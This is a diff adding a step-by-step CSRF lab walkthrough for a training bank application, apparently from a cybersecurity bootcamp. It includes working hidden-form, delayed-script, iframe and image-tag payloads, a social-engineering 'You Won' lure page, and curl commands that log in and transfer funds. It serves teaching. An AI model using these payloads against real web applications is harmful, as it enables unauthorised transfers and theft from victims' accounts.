@@ -259,4 +259,282 @@ curl -X POST http://10.10.61.221/share/transfer \
 
 ---
 
+## Detailed Step-by-Step Walkthrough
+
+> **Verified:** March 2026
+
+Follow these exact steps to exploit the CSRF vulnerability.
+
+---
+
+### Step 1: Access the Bank Application
+
+**Open in browser:**
+```
+http://10.10.61.221/share/
+```
+
+You'll see "ThaiBank" login page with Thai language interface.
+
+---
+
+### Step 2: Check Pre-created Victim Account
+
+**Login as somchai:**
+- Username: `somchai`
+- Password: `password123`
+
+**Verify account details:**
+- Account Number: `1001`
+- Balance: `฿1,000,000`
+
+This is the victim account we'll steal from!
+
+---
+
+### Step 3: Register Your Attacker Account
+
+1. **Logout** from somchai's account
+2. Click **"สมัครสมาชิก"** (Register)
+3. Create your account:
+   - Username: `attacker` (or any name)
+   - Password: `attacker123`
+4. Note your assigned account number (e.g., `1002`)
+5. Your starting balance: `฿0`
+
+**Goal:** Make somchai transfer ฿50,000 to YOUR account!
+
+---
+
+### Step 4: Analyze the Transfer Form
+
+1. Login as **somchai** again
+2. Go to Transfer page
+3. Open **DevTools** (F12) → **Network** tab
+4. Make a small test transfer
+5. Observe the POST request:
+
+```http
+POST /share/transfer HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=eyJhY2NvdW50X25vIjoi...
+
+to_account=1002&amount=100
+```
+
+**Vulnerability identified:**
+- ❌ No CSRF token in the form
+- ❌ No Referer/Origin validation
+- ❌ Session cookie has no SameSite attribute
+- ✅ Only relies on session cookie for auth
+
+**This means:** Any website can submit this form if somchai is logged in!
+
+---
+
+### Step 5: Create CSRF Attack Payload
+
+**Option A: Use the Evil Page Builder**
+
+1. Open http://10.10.61.221/evil/
+2. In the payload editor, paste:
+
+```html
+<!DOCTYPE html>
+<html>
+<head><title>Congratulations!</title></head>
+<body>
+  <h1>🎉 You Won ฿100,000! Click to Claim!</h1>
+  <p>Processing your reward...</p>
+
+  <!-- Hidden CSRF attack -->
+  <form id="csrf" action="http://10.10.61.221/share/transfer" method="POST" style="display:none">
+    <input name="to_account" value="1002">
+    <input name="amount" value="50000">
+  </form>
+
+  <script>
+    // Auto-submit after 1 second
+    setTimeout(function() {
+      document.getElementById('csrf').submit();
+    }, 1000);
+  </script>
+</body>
+</html>
+```
+
+3. Click **Store** to save the payload
+4. Copy the generated URL
+
+**Option B: Local HTML File**
+
+Save the above HTML as `attack.html` and open it in your browser.
+
+---
+
+### Step 6: Execute the Attack
+
+**Scenario simulation:**
+
+1. **Keep somchai logged in** at `/share/` (don't logout!)
+2. **In the same browser**, open a new tab
+3. Visit the malicious page (evil URL or your attack.html)
+4. The hidden form **auto-submits** with somchai's session
+5. **Money is transferred** without any user interaction!
+
+---
+
+### Step 7: Verify the Attack Succeeded
+
+**Check somchai's balance:**
+1. Go back to http://10.10.61.221/share/dashboard
+2. Balance should be reduced by ฿50,000
+
+**Check attacker's balance:**
+1. Logout from somchai
+2. Login as your attacker account
+3. Balance should show ฿50,000!
+
+**Check transaction history:**
+You'll see a transaction from 1001 → 1002 for ฿50,000
+
+---
+
+### Attack Results Example
+
+| Account | Before Attack | After Attack | Change |
+|---------|---------------|--------------|--------|
+| 1001 (somchai) | ฿1,000,000 | ฿950,000 | -฿50,000 |
+| 1002 (attacker) | ฿0 | ฿50,000 | +฿50,000 |
+
+**Transaction log:**
+```
+1001 -> 1002: 50,000.00 baht (transfer) at 2026-03-06 20:21:15
+```
+
+---
+
+### Step 8: Understanding Why This Works
+
+```
+CSRF Attack Flow:
+
+1. Somchai logs into ThaiBank
+   └── Browser stores session cookie for 10.10.61.221
+
+2. Somchai visits attacker's page (evil.com or /evil/)
+   └── Page contains hidden form targeting /share/transfer
+
+3. JavaScript auto-submits the hidden form
+   └── Browser automatically includes ALL cookies for 10.10.61.221
+
+4. ThaiBank receives the request
+   └── Valid session cookie ✓
+   └── Valid form data ✓
+   └── No CSRF token to check ✗
+
+5. Transfer executes successfully
+   └── Somchai's money → Attacker's account
+   └── Somchai never clicked "Transfer"!
+```
+
+---
+
+### Step 9: Test with curl (Command Line)
+
+**Get somchai's session:**
+```bash
+curl -s -X POST 'http://10.10.61.221/share/login' \
+  -d 'username=somchai&password=password123' \
+  -c cookies.txt
+```
+
+**Execute CSRF attack:**
+```bash
+curl -s -X POST 'http://10.10.61.221/share/transfer' \
+  -d 'to_account=1002&amount=50000' \
+  -b cookies.txt
+```
+
+**Check balance:**
+```bash
+curl -s 'http://10.10.61.221/share/dashboard' -b cookies.txt | grep -o '[0-9,]*\.[0-9]* บาท'
+```
+
+---
+
+## Multiple Attack Payloads
+
+### 1. Auto-Submit (Immediate)
+```html
+<body onload="document.getElementById('f').submit()">
+<form id="f" action="http://10.10.61.221/share/transfer" method="POST">
+  <input name="to_account" value="1002">
+  <input name="amount" value="50000">
+</form>
+</body>
+```
+
+### 2. Delayed Submit (Sneaky)
+```html
+<script>
+setTimeout(function(){
+  var f = document.createElement('form');
+  f.method = 'POST';
+  f.action = 'http://10.10.61.221/share/transfer';
+  f.innerHTML = '<input name="to_account" value="1002"><input name="amount" value="50000">';
+  document.body.appendChild(f);
+  f.submit();
+}, 3000); // 3 seconds delay
+</script>
+```
+
+### 3. Invisible iframe
+```html
+<iframe name="csrf-frame" style="display:none"></iframe>
+<form action="http://10.10.61.221/share/transfer" method="POST" target="csrf-frame">
+  <input name="to_account" value="1002">
+  <input name="amount" value="50000">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+### 4. Image Tag (GET only)
+```html
+<!-- Only works if endpoint accepts GET -->
+<img src="http://10.10.61.221/share/transfer?to_account=1002&amount=50000" style="display:none">
+```
+
+---
+
+## Quick Test URLs
+
+| Action | URL |
+|--------|-----|
+| Bank Login | http://10.10.61.221/share/ |
+| Bank Dashboard | http://10.10.61.221/share/dashboard |
+| Transfer Page | http://10.10.61.221/share/transfer |
+| Evil Page | http://10.10.61.221/evil/ |
+
+---
+
+## Troubleshooting
+
+**Attack not working?**
+- Ensure somchai is **logged in** before visiting evil page
+- Use the **same browser** (cookies are per-browser)
+- Check that session cookie hasn't expired
+- Verify the account number in your payload is correct
+
+**"Not logged in" error?**
+- Session expired - login as somchai again
+- Wrong browser/tab - cookies aren't shared across browsers
+
+**Transfer fails?**
+- Check if somchai has sufficient balance
+- Verify account number exists
+- Check browser console for errors
+
+---
+
 *LeaguesOfCode Cybersecurity Bootcamp 2026*
